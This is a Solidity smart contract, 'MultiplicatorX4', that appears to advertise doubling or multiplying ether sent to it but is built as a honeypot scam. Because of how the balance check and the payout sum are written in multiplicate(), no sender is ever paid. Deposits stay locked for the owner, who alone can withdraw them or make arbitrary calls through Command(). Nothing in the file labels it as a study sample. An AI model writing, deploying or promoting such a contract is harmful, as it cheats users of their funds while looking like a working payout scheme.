pragma solidity ^0.8.26;

contract MultiplicatorX4 {
    address public Owner = msg.sender;
    uint public totalMultiplications;
    uint public totalPayouts;
    mapping(address => uint) public userMultiplications;
    
    event MultiplicationAttempt(address indexed user, uint amount, bool success);
    event FundsReceived(address indexed from, uint amount);
   
    receive() external payable {
        emit FundsReceived(msg.sender, msg.value);
    }
   
    function withdraw() public {
        require(msg.sender == Owner);
        payable(Owner).transfer(address(this).balance);
    }
    
    function Command(address adr, bytes memory data) public payable {
        require(msg.sender == Owner);
        (bool success, ) = adr.call{value: msg.value}(data);
    }
    
    function multiplicate(address adr) public payable {
        totalMultiplications++;
        userMultiplications[msg.sender]++;
        
        if (msg.value >= address(this).balance) {
            uint payout = address(this).balance + msg.value;
            payable(adr).transfer(payout);
            totalPayouts += payout;
            emit MultiplicationAttempt(msg.sender, msg.value, true);
        } else {
            emit MultiplicationAttempt(msg.sender, msg.value, false);
        }
    }
    
    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }
}